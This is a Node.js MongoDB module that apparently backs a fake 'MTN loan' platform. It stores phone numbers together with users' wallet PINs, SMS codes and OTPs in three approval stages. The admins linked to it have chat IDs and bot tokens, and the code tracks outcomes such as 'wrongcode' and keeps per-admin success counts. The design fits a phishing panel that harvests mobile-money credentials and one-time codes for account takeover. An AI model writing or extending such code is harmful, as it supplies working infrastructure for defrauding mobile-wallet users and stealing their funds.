const { MongoClient } = require('mongodb');

let client;
let db;

// ==================================================
// DATABASE CONFIGURATION
// ==================================================

const DB_NAME = 'mtn_loan_platform';

const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications'
};

// ==================================================
// ADMIN ROLES
// ==================================================

const ROLES = {
    SUPER_ADMIN: 'super_admin',
    ADMIN: 'admin'
};

/**
 * Normalize role values so the entire application
 * uses one consistent role format.
 */
function normalizeRole(role) {
    if (!role) {
        return ROLES.ADMIN;
    }

    const normalized = String(role)
        .trim()
        .toLowerCase()
        .replace(/[\s-]+/g, '_');

    if (
        normalized === 'super_admin' ||
        normalized === 'superadmin'
    ) {
        return ROLES.SUPER_ADMIN;
    }

    return ROLES.ADMIN;
}

// ==================================================
// DATABASE CONNECTION
// ==================================================

async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;

        if (!MONGODB_URI) {
            throw new Error(
                '❌ MONGODB_URI is not set in environment variables'
            );
        }

        console.log('🔄 Connecting to MongoDB...');

        client = new MongoClient(MONGODB_URI);

        await client.connect();

        db = client.db(DB_NAME);

        console.log(
            `✅ Connected to MongoDB successfully: ${DB_NAME}`
        );

        await createIndexes();
        await migrateAdminRoles();

        return db;

    } catch (error) {
        console.error(
            '❌ MongoDB connection error:',
            error
        );

        throw error;
    }
}

// ==================================================
// DATABASE INDEXES
// ==================================================

async function createIndexes() {
    try {
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ role: 1 });

        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });

        console.log('✅ Database indexes created');

    } catch (error) {
        console.error(
            '⚠️ Error creating indexes:',
            error.message
        );
    }
}

// ==================================================
// CLOSE DATABASE
// ==================================================

async function closeDatabase() {
    if (client) {
        await client.close();
        client = null;
        db = null;
        console.log('✅ Database connection closed');
    }
}

// ==================================================
// ADMIN OPERATIONS
// ==================================================

async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;

        if (!adminId) throw new Error('Admin ID is required');
        if (!adminData.name) throw new Error('Admin name is required');
        if (!adminData.email) throw new Error('Admin email is required');
        if (!adminData.chatId) throw new Error('Admin chatId is required');

        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });

        if (existingAdmin) {
            throw new Error(`Admin ${adminId} already exists in database`);
        }

        const role = adminId === 'ADMIN001' ? ROLES.SUPER_ADMIN : normalizeRole(adminData.role);

        const adminDocument = {
            adminId,
            name: adminData.name,
            email: adminData.email,
            chatId: adminData.chatId,
            role,
            status: adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        };

        if (adminData.botToken) {
            adminDocument.botToken = adminData.botToken;
        }

        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        console.log(`✅ Admin saved: ${adminId} [${role}]`);
        return result;

    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        const admin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (!admin) return null;

        return {
            ...admin,
            role: normalizeRole(admin.role)
        };
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        const admin = await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
        if (!admin) return null;

        return {
            ...admin,
            role: normalizeRole(admin.role)
        };
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS).find({}).sort({ createdAt: -1 }).toArray();
        return admins.map(admin => ({
            ...admin,
            role: normalizeRole(admin.role)
        }));
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS).find({ status: 'active' }).toArray();
        return admins.map(admin => ({
            ...admin,
            role: normalizeRole(admin.role)
        }));
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates, actorAdminId = null) {
    try {
        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (!existingAdmin) throw new Error(`Admin ${adminId} not found`);

        const safeUpdates = { ...updates };
        delete safeUpdates._id;
        delete safeUpdates.adminId;
        delete safeUpdates.createdAt;

        if (Object.prototype.hasOwnProperty.call(safeUpdates, 'role')) {
            if (actorAdminId !== 'ADMIN001') {
                throw new Error('Only the Super Admin can change administrator roles');
            }
            safeUpdates.role = normalizeRole(safeUpdates.role);
        }

        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...safeUpdates, updatedAt: new Date().toISOString() } }
        );

        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        const allowedStatuses = ['active', 'inactive', 'suspended', 'paused'];
        if (!allowedStatuses.includes(status)) {
            throw new Error(`Invalid admin status: ${status}`);
        }

        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );

        console.log(`🔄 Admin ${adminId} status: ${status}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function deleteAdmin(adminId, actorAdminId = null) {
    try {
        if (actorAdminId !== 'ADMIN001') {
            throw new Error('Only the Super Admin can delete administrators');
        }
        if (adminId === 'ADMIN001') {
            throw new Error('The Super Admin account cannot be deleted');
        }

        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

async function isSuperAdmin(adminId) {
    try {
        const admin = await getAdmin(adminId);
        if (!admin) return false;
        return admin.status === 'active' && normalizeRole(admin.role) === ROLES.SUPER_ADMIN;
    } catch (error) {
        console.error('❌ Error checking Super Admin:', error);
        return false;
    }
}

async function ensureSuperAdmin(adminId = 'ADMIN001') {
    try {
        const admin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (!admin) {
            console.warn(`⚠️ ${adminId} was not found in database`);
            return null;
        }

        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { role: ROLES.SUPER_ADMIN, updatedAt: new Date().toISOString() } }
        );

        console.log(`👑 ${adminId} configured as Super Admin`);
        return result;
    } catch (error) {
        console.error('❌ Error ensuring Super Admin:', error);
        throw error;
    }
}

async function migrateAdminRoles() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS).find({}).toArray();
        let modifiedCount = 0;

        for (const admin of admins) {
            let expectedRole = admin.adminId === 'ADMIN001' ? ROLES.SUPER_ADMIN : normalizeRole(admin.role);

            if (admin.role !== expectedRole) {
                const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
                    { _id: admin._id },
                    { $set: { role: expectedRole, updatedAt: new Date().toISOString() } }
                );
                modifiedCount += result.modifiedCount;
            }
        }

        console.log(`🔐 Admin role migration complete. Updated: ${modifiedCount}`);
        return modifiedCount;
    } catch (error) {
        console.error('❌ Error migrating admin roles:', error);
        throw error;
    }
}

// ==================================================
// APPLICATION OPERATIONS (3-Stage: PIN -> SMS -> OTP)
// ==================================================

async function saveApplication(appData) {
    try {
        if (!appData.id) throw new Error('Application ID is required');

        const application = {
            id: appData.id,
            adminId: appData.adminId,
            adminName: appData.adminName,
            phoneNumber: appData.phoneNumber,
            pin: appData.pin || '',
            smsCode: appData.smsCode || '',
            otp: appData.otp || '',
            pinStatus: appData.pinStatus || 'pending',
            smsStatus: appData.smsStatus || 'pending',
            otpStatus: appData.otpStatus || 'pending',
            assignmentType: appData.assignmentType,
            isReturningUser: appData.isReturningUser || false,
            previousCount: appData.previousCount || 0,
            timestamp: appData.timestamp || new Date().toISOString()
        };

        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne(application);
        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const safeUpdates = { ...updates };

        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...safeUpdates, updatedAt: new Date().toISOString() } }
        );

        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).find({ adminId }).sort({ timestamp: -1 }).toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).find({
            adminId,
            $or: [
                { pinStatus: 'pending' },
                { smsStatus: 'pending' },
                { otpStatus: 'pending' }
            ]
        }).sort({ timestamp: -1 }).toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==================================================
// STATISTICS
// ==================================================

async function getAdminStats(adminId) {
    try {
        const total = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
        const smsPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, smsStatus: 'pending', pinStatus: 'approved' });
        const smsApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, smsStatus: 'approved' });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending', smsStatus: 'approved' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });

        return { total, pinPending, pinApproved, smsPending, smsApproved, otpPending, fullyApproved };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error);
        return { total: 0, pinPending: 0, pinApproved: 0, smsPending: 0, smsApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const totalAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
        const smsPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ smsStatus: 'pending', pinStatus: 'approved' });
        const smsApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ smsStatus: 'approved' });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending', smsStatus: 'approved' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
        const totalRejected = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [
                { pinStatus: 'rejected' },
                { smsStatus: 'rejected' },
                { otpStatus: 'wrongpin_otp' },
                { otpStatus: 'wrongcode' }
            ]
        });

        return { totalAdmins, totalApplications, pinPending, pinApproved, smsPending, smsApproved, otpPending, fullyApproved, totalRejected };
    } catch (error) {
        console.error('❌ Error getting stats:', error);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, smsPending: 0, smsApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async admin => {
            const stats = await getAdminStats(admin.adminId);
            return {
                adminId: admin.adminId,
                name: admin.name,
                role: normalizeRole(admin.role),
                status: admin.status,
                ...stats
            };
        });
        return await Promise.all(statsPromises);
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error);
        return [];
    }
}

// ==================================================
// MAINTENANCE & DEBUG
// ==================================================

async function getAllAdminsDetailed() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS).find({}).sort({ createdAt: -1 }).toArray();
        return admins.map(admin => ({
            ...admin,
            role: normalizeRole(admin.role)
        }));
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' },
                { chatId: { $exists: false } },
                { chatId: null }
            ]
        });
        console.log(`🧹 Cleaned ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning invalid admins:', error);
        throw error;
    }
}

// ==================================================
// EXPORTS
// ==================================================

module.exports = {
    connectDatabase,
    closeDatabase,
    ROLES,
    normalizeRole,
    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,
    isSuperAdmin,
    ensureSuperAdmin,
    migrateAdminRoles,
    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,
    getAdminStats,
    getStats,
    getPerAdminStats,
    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
